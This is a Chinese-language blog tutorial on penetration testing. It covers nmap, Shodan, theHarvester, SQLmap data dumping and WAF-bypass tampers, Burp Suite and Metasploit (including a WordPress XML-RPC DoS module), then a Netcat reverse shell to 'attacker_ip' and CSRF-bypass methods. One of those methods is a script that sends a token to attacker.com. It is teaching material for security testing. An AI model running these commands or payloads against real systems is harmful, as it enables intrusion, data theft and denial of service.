---
layout: post
title: 渗透测试
subtitle:
tags: [Test]
comments: true
---

## 信息收集

#### Nmap
Nmap: 网络扫描和嗅探工具。


在macOS上：
```shell
brew install nmap
```
基础扫描:
```shell
nmap 192.168.1.1
```

```shell
nmap 192.168.1.1 192.168.1.2 192.168.1.3
```
```shell
nmap 192.168.1.1/24
```
高级扫描:


扫描特定端口

```shell
nmap -p 22,80,443 192.168.1.1
```
这将只扫描目标主机上的22、80和443端口。

使用TCP SYN扫描

```shell
nmap -sS 192.168.1.1
```
这是一种更隐蔽的扫描方式，不会在目标主机上留下太多痕迹。

扫描UDP端口

```bash
nmap -sU 192.168.1.1
```
这将扫描目标主机上的UDP端口。

操作系统检测

```bash
nmap -O 192.168.1.1
```
这将尝试识别目标主机的操作系统。

保存扫描结果

```bash
nmap -oN output.txt 192.168.1.1
```
这将把扫描结果保存到output.txt文件中。

#### Shodan
Shodan: 互联网搜索引擎，用于查找各种在线设备。

> 注册和登录

访问Shodan网站（https://www.shodan.io/）。
注册一个账号并登录。

> 基础搜索

在搜索框中输入你想搜索的关键字，例如“webcam”。
按下Enter键，Shodan会列出与关键字相关的设备。

> 使用过滤器

Shodan支持多种搜索过滤器，例如：
country:US：只显示美国的设备。
port:21：只显示开放了21端口（FTP）的设备。
os:Windows：只显示运行Windows操作系统的设备。

使用Shodan API
Shodan还提供了API，允许你在自己的应用程序中进行搜索。你需要从Shodan网站获取API密钥。

以下是一个使用Python和Shodan API进行搜索的简单示例：

```python
from shodan import Shodan

api = Shodan('YOUR_API_KEY')

# Search for devices
results = api.search('webcam')

# Loop through the results and print information
for result in results['matches']:
    print(f"IP: {result['ip_str']}")
    print(f"Port: {result['port']}")
    print(f"Organization: {result.get('org', 'N/A')}")
    print("===")
```


#### Censys
Censys: 类似于Shodan的搜索引擎。

#### theHarvester

theHarvester: 用于收集电子邮件地址、子域名、主机、开放端口等信息。
theHarvester 是一款用于收集电子邮件地址、子域名、主机、开放端口、员工姓名等信息的工具，主要用于渗透测试和枚举阶段。这个工具可以从多个公开来源获取信息，包括搜索引擎、Shodan、Censys 等。

> 安装

首先，你需要安装 theHarvester。如果你使用的是 Kali Linux，该工具可能已经预安装了。如果没有，你可以通过以下命令进行安装：

```bash
git clone https://github.com/laramies/theHarvester.git
cd theHarvester
```
```bash
python3 -m pip install -r requirements.txt
```

基础用法
电子邮件地址收集
以下命令从 Google 搜索引擎收集目标域（example.com）的电子邮件地址：

```bash
python3 theHarvester.py -d example.com -b google
```
子域名枚举
以下命令从 Bing 搜索引擎收集目标域（example.com）的子域名：

```bash
python3 theHarvester.py -d example.com -b bing
```
使用多个数据源
你还可以使用多个数据源来进行更全面的信息收集。例如：

```bash
python3 theHarvester.py -d example.com -b google,bing,linkedin
```
保存结果
可以将收集到的信息保存到一个文件中，以便后续分析：

```bash
python3 theHarvester.py -d example.com -b google -f output.txt
```
其他选项
theHarvester 还有很多其他选项和高级功能，可以通过运行 python3 theHarvester.py -h 来查看所有可用选项。


## Web应用测试

#### SQLmap

SQLmap: 自动化SQL注入和数据库挖掘工具。

MacOS 安装
```bash
brew install sqlmap
```
Linux 安装 SQLmap
如果你使用的是 Kali Linux，SQLmap 可能已经预安装了。如果没有，你可以通过以下命令进行安装：

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

> 基础用法

测试 GET 参数
假设你有一个目标 URL，它的 id 参数可能存在 SQL 注入漏洞：

```bash
http://example.com/page.php?id=1
```
你可以使用以下命令来测试这个参数：

```bash
python sqlmap.py -u "http://example.com/page.php?id=1"
```
测试 POST 参数
如果目标使用 POST 方法提交数据，你可以使用 -data 参数：

```bash
python sqlmap.py -u "http://example.com/page.php" --data="id=1"
```
使用 Cookie
如果需要，你还可以添加 Cookie 数据：

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"
```
数据提取
获取数据库名称
```bash
python sqlmap.py -u "http://example.com/page.php?id=1" --dbs
```
获取表名称
```bash
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name --tables
```
获取列名称
```bash
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns
```
提取数据

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump
```
高级用法
SQLmap 还有很多高级选项，如使用代理、绕过 WAF、进行延时测试等。你可以通过运行 python sqlmap.py -h 来查看所有可用选项。

使用代理
要通过代理服务器运行 sqlmap，你可以使用 --proxy 参数：

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```
这里，http://127.0.0.1:8080 是代理服务器的地址和端口。

绕过 WAF
sqlmap 提供了一些用于绕过 WAF 的技术，这些可以通过 --tamper 参数来指定：

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --tamper="between,randomcase,space2comment"
```
这里，between、randomcase 和 space2comment 是 tamper 脚本，用于修改 SQL 语句以绕过 WAF。

进行延时测试
如果你想控制请求之间的时间延迟，可以使用 --delay 和 --timeout 参数：
```bash
sqlmap -u "http://target.com/vuln.php?id=1" --delay=0.5 --timeout=30
```
这里，--delay=0.5 指定每个请求之间延迟 0.5 秒，--timeout=30 指定请求超时为 30 秒。

OWASP ZAP: 开源的Web应用安全测试平台。

#### Burp Suite

Burp Suite: Web应用安全测试工具。

> 安装和启动
下载 Burp Suite Community Edition（免费版）或 Professional Edition（付费版）。
安装并启动 Burp Suite。

> 设置代理
打开 Burp Suite，转到 "Proxy" -> "Options"。
确保代理监听器处于活动状态，默认监听地址通常是 127.0.0.1:8080。
在你的 Web 浏览器中，设置 HTTP 代理为 Burp Suite 的监听地址。

> 拦截请求
在 Burp Suite 中，转到 "Proxy" -> "Intercept"。
确保 "Intercept is on" 已经启用。
在浏览器中访问一个网站，你应该能在 Burp Suite 中看到拦截到的 HTTP 请求。

> 爬虫和扫描
在拦截到的请求上右键，选择 "Send to Spider" 或 "Send to Scanner"。
如果选择了 "Spider"，转到 "Target" -> "Site map"，你会看到爬虫开始收集的 URL。
如果选择了 "Scanner"，转到 "Dashboard"，你会看到扫描的进度和结果。

> 其他功能
"Repeater" 可用于手动修改和重新发送 HTTP 请求。
"Decoder" 可用于解码和编码各种数据格式。
"Comparer" 可用于比较两个或多个数据集。
注意：未经授权的渗透测试是非法的。确保你有明确的授权来使用这些工具和技术。


## 操作系统和网络层测试

#### Metasploit

Metasploit: 用于开发、测试和执行漏洞利用代码的框架。

安装 Metasploit

```bash
brew install --cask metasploit
```
```bash
msfconsole     
Would you like to use and setup a new database (recommended)? y
```

```shell
         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.3.37-dev-6aeffa5a177be312dc317e161cc088655496c869]
+ -- --=[ 2363 exploits - 1228 auxiliary - 413 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```

在 Metasploit 中执行 search wordpress 会返回与 WordPress 相关的一系列模块。这些模块可以是用于攻击、扫描或其他目的的。下面是一些关键字段的解释：

模块类型：这描述了模块的类型。它可以是 exploit（用于利用漏洞）、auxiliary（辅助模块，如扫描器或 DOS 攻击工具）等。

exploit: 用于利用漏洞进行攻击。
auxiliary: 辅助模块，用于信息收集、扫描等。
dos: 用于执行拒绝服务（Denial of Service）攻击。
模块路径：这是模块在 Metasploit 中的路径，通常包括目标平台和具体的攻击或扫描类型。

发布日期：这是模块发布或最后更新的日期。

可靠性：这描述了模块的可靠性级别，如 excellent、normal 等。

是否需要身份验证：Yes 或 No 表示是否需要身份验证才能使用该模块。

模块描述：这是对模块功能的简短描述。

例如：

exploit/multi/http/wp_plugin_sp_project_document_rce 是一个 exploit 类型的模块，用于攻击 WordPress 的 SP Project & Document 插件。它在 2021-06-14 发布，可靠性为 excellent，并且需要身份验证（Yes）。

auxiliary/scanner/http/wordpress_xmlrpc_login 是一个 auxiliary 类型的模块，用于扫描 WordPress 站点以查找有效的 XML-RPC 登录凭据。它不需要身份验证（No）。

这些模块通常用于渗透测试或安全研究，但也可能被用于非法活动。因此，在使用这些模块之前，请确保你有适当的授权和合法的目的。


基础使用
搜索模块：在 Metasploit 控制台中，你可以使用 search 命令来查找特定的漏洞或模块。

```bash
search wordpress
```
选择模块：找到你想使用的模块后，使用 use 命令来选择它。

```bash
use auxiliary/dos/http/wordpress_xmlrpc_dos 
````
查看选项：使用 show options 来查看模块需要哪些参数。

```bash
show options
```
设置参数：使用 set 命令来设置参数。

设置目标主机（RHOSTS）: 这是你想要攻击的目标服务器的 IP 地址或域名。

```bash
set RHOSTS target.com
```
设置目标端口（RPORT）: 默认是 80，如果目标服务器使用不同的端口，请更改它。

```bash
set RPORT 8080
```
设置请求限制（RLIMIT）: 这是要发送的请求的数量。默认是 1000。

```bash
set RLIMIT 1000
```
设置目标 URI（TARGETURI）: 如果 WordPress 安装在子目录中，你需要设置这个。

```bash
set TARGETURI /wordpress/
```
设置 SSL（SSL）: 如果目标网站使用 HTTPS，将这个选项设置为 true。

```bash
set SSL true
```
设置代理（Proxies）: 如果你想通过代理进行攻击，可以设置这个选项。

```bash
set Proxies http:127.0.0.1:8080
```
设置虚拟主机（VHOST）: 如果目标服务器使用虚拟主机，设置这个选项。

```bash
set VHOST virtualhost.com
```
运行攻击: 一旦所有设置都完成，你可以运行攻击。

```bash
run
```

```bash
set RHOSTS target.com
set USERNAME admin
set PASSWORD password123
```
执行攻击：一切准备就绪后，输入 exploit 或 run 来执行攻击。

```bash
exploit
```
有效载荷（Payloads）：某些模块允许你设置不同类型的有效载荷。你可以使用 show payloads 查看可用的有效载荷，并用 set PAYLOAD 来设置。

获取会话（Sessions）：成功的攻击通常会创建一个会话，你可以用 sessions 命令查看它们。

```bash
sessions -l
```
交互式会话：使用 sessions -i [会话ID] 进入交互式会话。

```bash
sessions -i 1
```

#### Netcat
Netcat: 网络调试和探查工具。

```shell
brew install netcat
```

基础用法
创建一个简单的 TCP 服务器

打开一个终端并运行以下命令以在端口 1234 上启动一个 TCP 服务器。

```bash
nc -l 1234
```
创建一个简单的 TCP 客户端

打开另一个终端并运行以下命令以连接到上面创建的服务器。

```bash
nc localhost 1234
```
现在，你可以在客户端终端中输入文本，并在服务器终端中看到相同的文本。

文件传输

服务器端： 在服务器端等待接收文件。
```bash
nc -l 1234 > received_file.txt
```
客户端端： 发送一个文件到服务器。

```bash
nc localhost 1234 < send_file.txt
```

端口扫描
你可以使用 Netcat 执行基础的端口扫描。

```bash
nc -zv localhost 20-80
```

高级用法

反向 Shell
攻击者机器： 在攻击者的机器上运行。
```bash
nc -l 1234
```
目标机器： 在目标机器上运行。

```bash
nc attacker_ip 1234 -e /bin/bash
```

攻击者机器: 这是发起攻击的计算机。在这个计算机上，攻击者会运行各种工具和命令，试图访问或控制目标机器。在给出的例子中，nc -l 1234 是在攻击者机器上运行的，用于监听（等待）目标机器的连接。

目标机器: 这是攻击者试图访问或控制的计算机。在给出的例子中，nc attacker_ip 1234 -e /bin/bash 是在目标机器上运行的。这个命令会连接到攻击者机器，并执行 /bin/bash，从而允许攻击者通过网络执行 shell 命令。

简单来说，如果你是目标（被攻击者），你不会在自己的机器上运行 nc attacker_ip 1234 -e /bin/bash，因为这样做会给攻击者提供对你机器的控制权。相反，攻击者会尝试某种方式让你的机器执行这个命令，以便他们能够控制你的机器。



Wireshark: 网络协议分析器。

密码破解
John the Ripper: 密码破解工具。
Hashcat: 高级密码恢复工具。

无线网络测试
Aircrack-ng: 用于802.11 WEP和WPA-PSK密钥破解的工具套件。
Kismet: 无线网络侦查和侦查工具。

社会工程攻击
SET (Social Engineer Toolkit): 社会工程攻击工具套件。
Phishing Frenzy: 钓鱼攻击模板管理框架。

其他工具
Gitrob: 用于查找敏感数据泄露的GitHub存储库。
Droopescan: 用于扫描Drupal、WordPress和其他CMS的工具。
BeEF (Browser Exploitation Framework): 专注于Web浏览器的渗透测试工具。
框架和平台
Kali Linux: 包含多种渗透测试工具的Linux发行版。
PentestBox: Windows上的渗透测试环境。
这些工具只是冰山一角，渗透测试是一个不断发展的领域，新的工具和技术不断出现。除了掌握这些工具外，深入的理论知识和实践经验也是非常重要的。






## CSRF

### 常见的方法
绕过 CSRF（跨站请求伪造）保护的方法通常涉及对目标网站的安全机制的深入理解和利用。这些方法可能包括但不限于：

1. 利用站点的逻辑漏洞
不完全的 CSRF 令牌验证：如果网站只部分验证 CSRF 令牌，攻击者可能会尝试找到可以绕过验证的方法。

2. 利用第三方网站的漏洞
点击劫持（Clickjacking）：攻击者可以在一个看似无害的网页上嵌入目标网站的页面，并诱导用户进行点击，从而触发 CSRF 攻击。

3. 利用用户的信任
社会工程学：攻击者可能会通过钓鱼邮件或其他方式诱导用户点击一个精心设计的链接，该链接会触发 CSRF 攻击。

4. 利用网站的 CORS 设置
错误配置的 CORS（跨源资源共享）：如果目标网站错误地配置了 CORS 设置，攻击者可能会利用这一点进行 CSRF 攻击。

5. HTTP 请求走私
HTTP Request Smuggling：通过精心构造的请求，攻击者可能能够绕过前端安全设备（如 Web 应用防火墙）的检查，从而执行 CSRF 攻击。

6. 利用网站的 XSS 漏洞
跨站脚本（XSS）：如果网站存在 XSS 漏洞，攻击者可以注入恶意脚本来获取 CSRF 令牌，然后执行 CSRF 攻击。

7. 利用自动填充功能
自动填充表单：某些浏览器或插件可能会自动填充表单，攻击者可能会利用这一点来触发 CSRF 攻击。

8. 利用移动应用的漏洞
移动应用中的 WebView 组件：如果移动应用使用 WebView 来加载网页，并且没有正确实现 CSRF 保护，攻击者可能会利用这一点。

9. 其他绕过技术
Meta 标签、JavaScript 重定向等：某些情况下，使用 HTML Meta 标签或 JavaScript 进行页面重定向可能会绕过 CSRF 保护。




### 1.跨账户使用 CSRF 令牌

最简单和最致命的CSRF绕过是当应用程序不验证CSRF令牌是否绑定到特定帐户并且仅验证算法时。验证这一点

> 从账户 A 登录应用程序

> 转到其密码更改页面

> 使用Burpsuite捕获 CSRF 令牌

> 使用帐户 B 注销和登录

> 转到密码更改页面并拦截该请求

> 替换 CSRF 令牌

这个过程描述了一种 CSRF（跨站请求伪造）攻击的绕过方法，该方法利用了应用程序在处理 CSRF 令牌时的一个关键漏洞：即应用程序没有将 CSRF 令牌绑定到特定的用户账户。

下面是具体的步骤解释：

步骤 1：从账户 A 登录应用程序
首先，攻击者使用账户 A 登录到目标应用程序。
步骤 2：转到其密码更改页面
攻击者导航到应用程序的密码更改页面。
步骤 3：使用 Burp Suite 捕获 CSRF 令牌
在这一步，攻击者使用 Burp Suite（一种常用的 Web 安全测试工具）来拦截和捕获生成的 CSRF 令牌。
步骤 4：使用账户 B 注销和登录
现在，攻击者从账户 A 注销，并使用另一个账户 B 登录。
步骤 5：转到密码更改页面并拦截该请求
攻击者再次导航到密码更改页面，并使用 Burp Suite 拦截这次的请求。
步骤 6：替换 CSRF 令牌
在这一步，攻击者将拦截到的请求中的 CSRF 令牌替换为第一次捕获的令牌（即账户 A 的令牌）。
如果应用程序没有将 CSRF 令牌与特定用户绑定，那么这个替换的令牌将会被接受，从而允许攻击者以账户 B 的身份更改密码。

这种攻击是致命的，因为它允许攻击者以其他用户的身份执行敏感操作，而不需要知道他们的密码或其他凭据。


### 2.相同长度的替换值

> 另一种技术是找到该标记的长度，例如，它是变量下的 32 个字符的字母数字标记，authenticity_token替换相同的变量，其他 32 个字符的值

例如，令牌是ud019eh10923213213123，可以将其替换为相同值的令牌。

示例：
假设原始的 CSRF 令牌是 ud019eh10923213213123，这是一个 32 个字符的字母数字字符串。

攻击步骤：
分析令牌格式：首先，攻击者会分析这个 CSRF 令牌的格式。在这个例子中，它是一个 32 个字符的字母数字字符串。

生成新令牌：然后，攻击者生成另一个符合相同格式要求的令牌。例如，他们可能生成一个新的 32 个字符的字母数字字符串，如 ab123456789012345678901234567890。

替换令牌：攻击者现在将原始请求中的 CSRF 令牌替换为他们生成的新令牌。

发送请求：最后，攻击者发送这个修改过的请求。

如果应用程序在验证 CSRF 令牌时只检查其长度和格式，而不检查其实际内容，那么这个新的令牌就有可能被接受，从而成功绕过 CSRF 保护。

### 3.从请求中完全删除 CSRF 令牌

> 这种技术通常适用于帐户删除功能，其中令牌根本不经过验证，使攻击者具有通过CSRF删除任何用户帐户的优势。

但我发现它也可以在其他功能上使用。很简单，使用burpsuite拦截请求并从整个中删除令牌

这种绕过 CSRF 保护的方法基于一个假设：应用程序在处理某些请求时，可能没有严格验证 CSRF 令牌。在这种情况下，即使请求中没有 CSRF 令牌，应用程序也可能会接受并处理该请求。

示例：
假设一个应用程序有一个用于删除用户账户的功能，该功能需要一个 CSRF 令牌。

攻击步骤：
拦截请求：首先，攻击者使用工具（如 Burp Suite）拦截向服务器发送的删除账户的 HTTP 请求。

删除令牌：然后，攻击者从拦截的请求中完全删除 CSRF 令牌。

发送请求：最后，攻击者发送这个修改过的请求。

如果应用程序没有正确验证 CSRF 令牌，那么这个没有令牌的请求可能会被接受，从而导致账户被删除。

这种方法的成功与否取决于应用程序如何实施其 CSRF 保护。如果应用程序没有严格验证 CSRF 令牌，或者在没有令牌的情况下也接受请求，那么这种攻击就有可能成功。

### 4.解码 CSRF token

绕过 CSRF 的另一种方法是识别 CSRF 令牌的算法。

CSRF 令牌是 MD5 或 Base64 编码值。可以解码该值并在该算法中对下一个值进行编码，并使用该令牌。

例如“a0a080f42e6f13b3a2df133f073095dd”是MD5（122）。也可以类似地加密下一个值 MD5（123） 到 CSRF 令牌绕过。

示例：
假设一个应用程序使用 MD5 算法和一个固定的值（比如 "122"）来生成 CSRF 令牌。这样，MD5("122") 就会生成一个特定的 CSRF 令牌，比如 "a0a080f42e6f13b3a2df133f073095dd"。

攻击步骤：
识别算法：首先，你需要识别出应用程序是如何生成 CSRF 令牌的。这可能需要一些逆向工程或代码审计。

生成新令牌：一旦你知道了算法和用于生成令牌的值（在这个例子中是 "122" 和 MD5 算法），你就可以生成一个新的令牌。比如，使用 "123" 作为新的值，然后计算 MD5("123")。

替换令牌：最后，你可以在发送到服务器的请求中使用这个新生成的 CSRF 令牌，从而绕过 CSRF 保护。

如果应用程序没有其他额外的安全检查，这种方法就有可能成功。

注意：
这种方法需要对目标应用有深入的了解，包括其如何生成和验证 CSRF 令牌。

这种方法也假设应用程序的 CSRF 令牌生成方式存在缺陷，比如使用了简单的算法和固定的值。


### 5.通过 HTML 注入提取令牌
此技术利用 HTML 注入漏洞，攻击者可以利用该漏洞植入记录器，从该网页中提取 CSRF 令牌并使用该令牌。攻击者可以植入链接，例如

```html
<form action=“http://shahmeeramir.com/acquire_token.php”></textarea>
```
例如，攻击者可以在 HTML 注入的代码中添加 JavaScript，该代码会获取 CSRF 令牌并将其发送到攻击者的服务器。

```html
<script>
  var csrfToken = document.getElementsByName("csrf_token")[0].value;
  new Image().src = 'http://attacker.com/collect.php?token=' + csrfToken;
</script>
```
在这个例子中，JavaScript 代码会查找名为 csrf_token 的 HTML 元素（通常是一个隐藏的输入字段），获取其值（即 CSRF 令牌），然后通过创建一个新的 Image 对象并设置其 src 属性为攻击者服务器上的一个 URL（附加了 CSRF 令牌作为查询参数）来将其发送到攻击者的服务器。

当这个 Image 对象被创建时，浏览器会尝试加载这个图片，从而触发一个到攻击者服务器的 HTTP 请求，该请求包含了 CSRF 令牌。

这样，攻击者就可以从他们自己的服务器日志或其他收集机制中获取这个令牌，并用它来进行 CSRF 攻击。

### 6. 仅使用令牌的静态部分
CSRF token由两部分组成。静态部件和动态部件。

> 考虑两个CSRF令牌shahmeer742498h989889shahmeer7424ashda099s。大多数情况下，如果使用令牌的静态部分作为shahmeer7424，则可以使用该令牌 

在这个例子中，CSRF 令牌由两部分组成：一个静态部分和一个动态部分。在给出的两个令牌 "shahmeer742498h989889" 和 "shahmeer7424ashda099s" 中，静态部分是 "shahmeer7424"，而动态部分分别是 "98h989889" 和 "ashda099s"。

这种情况下，如果应用程序在验证 CSRF 令牌时只检查静态部分（即 "shahmeer7424"），那么攻击者可以只使用这一部分来绕过 CSRF 保护。

如何进行攻击：
识别静态和动态部分：首先，你需要确定令牌中哪一部分是静态的，哪一部分是动态的。

构造新令牌：然后，你可以使用静态部分构造一个新的 "有效" 令牌。在这个例子中，你可以使用 "shahmeer7424" 加上任意的动态部分。

替换令牌：最后，在发送到服务器的请求中使用这个新构造的令牌。

如果应用程序只检查令牌的静态部分，那么这种攻击就有可能成功。

注意：
这种方法需要你能够识别出 CSRF 令牌的静态和动态部分，这可能需要一些逆向工程或代码审计。

这种方法也假设应用程序的 CSRF 令牌验证机制存在缺陷。